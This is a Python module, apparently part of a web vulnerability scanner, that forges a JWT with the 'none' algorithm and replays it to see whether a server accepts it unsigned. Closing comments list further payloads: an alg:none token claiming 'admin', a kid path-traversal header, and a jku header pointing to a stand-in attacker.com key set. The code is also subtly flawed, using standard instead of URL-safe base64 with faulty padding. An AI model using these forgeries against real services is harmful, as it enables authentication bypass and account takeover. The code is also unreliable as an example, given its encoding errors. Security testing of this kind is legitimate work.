import requests
import base64
import json
from . import get_session

# Attempt to forge a JWT token using 'none' algorithm
def check(url, session=None):
    req_session = get_session(session)
    findings = []
    
    # Get the initial response to check for JWT tokens
    try:
        r = req_session.get(url, timeout=5)
        
        # Look for JWT in Authorization header or response body
        auth_header = r.headers.get('Authorization', '')
        if 'Bearer ' in auth_header:
            original_token = auth_header.split('Bearer ')[1]
            
            # Create a forged token using the "none" algorithm vulnerability
            try:
                # Split the token into parts
                parts = original_token.split('.')
                if len(parts) == 3:
                    # Decode the header
                    header_data = json.loads(base64.b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4)).decode('utf-8'))
                    # Change the algorithm to "none"
                    header_data['alg'] = 'none'
                    # Re-encode the header
                    new_header = base64.b64encode(json.dumps(header_data).encode('utf-8')).decode('utf-8').rstrip('=')
                    # Create the forged token
                    forged_token = new_header + '.' + parts[1] + '.'
                    
                    # Test if the forged token is accepted
                    r = req_session.get(url, headers={"Authorization": f"Bearer {forged_token}"}, timeout=5)
                    if r.status_code == 200:
                        findings.append("JWT None Algorithm Vulnerability: Server accepted token with 'none' algorithm")
            except Exception:
                pass
                
        # Also check for JWT in response body (simplified check)
        if 'eyJ' in r.text and '.' in r.text:
            findings.append("JWT found in response body - potential information leakage")
            
    except Exception:
        pass
        
    return findings

# === Exotic Payloads Enhancement ===

# JWT exotic payloads: alg:none and massive claim stuffing
#    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."

# === Advanced JWT Payloads ===
#    "{\\"alg\\": \\"HS256\\", \\"kid\\": \\"../../../../../../../dev/null\\"}",
#    "{\\"alg\\": \\"RS256\\", \\"jku\\": \\"https://attacker.com/evil.jwks.json\\", \\"kid\\": \\"attacker-key\\"}",
